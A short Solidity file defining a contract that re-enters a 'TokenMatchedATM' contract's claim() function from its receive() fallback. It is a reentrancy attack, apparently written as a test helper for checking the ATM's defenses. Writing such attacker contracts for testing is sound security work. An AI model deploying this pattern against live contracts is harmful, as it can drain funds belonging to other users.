// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITokenMatchedATM {
    function claim() external;
}

contract ReentrantClaimer {
    ITokenMatchedATM public immutable atm;
    IERC20 public immutable token;
    bool public reenter;

    constructor(address atm_, address token_) {
        atm = ITokenMatchedATM(atm_);
        token = IERC20(token_);
    }

    function approveAndAttack(uint256 amount) external {
        token.approve(address(atm), amount);
        reenter = true;
        atm.claim();
    }

    receive() external payable {
        if (reenter) {
            reenter = false;
            atm.claim();
        }
    }
}
